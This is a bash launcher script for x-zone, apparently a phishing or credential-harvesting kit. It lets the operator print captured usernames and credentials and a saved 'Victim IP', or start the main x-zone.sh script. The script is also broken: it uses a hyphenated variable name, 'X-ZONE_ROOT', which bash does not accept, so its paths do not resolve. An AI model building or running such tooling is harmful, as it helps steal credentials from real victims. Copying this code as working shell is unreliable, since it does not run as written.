#!/bin/bash

# https://github.com/rabikishanr/x-zone

if [[ $(uname -o) == *'Android'* ]];then
	X-ZONE_ROOT="/data/data/com.termux/files/usr/opt/x-zone"
else
	export X-ZONE_ROOT="/opt/x-zone"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run x-zone type \`x-zone\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $X-ZONE_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $X-ZONE_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $X-ZONE_ROOT
	bash ./x-zone.sh
fi
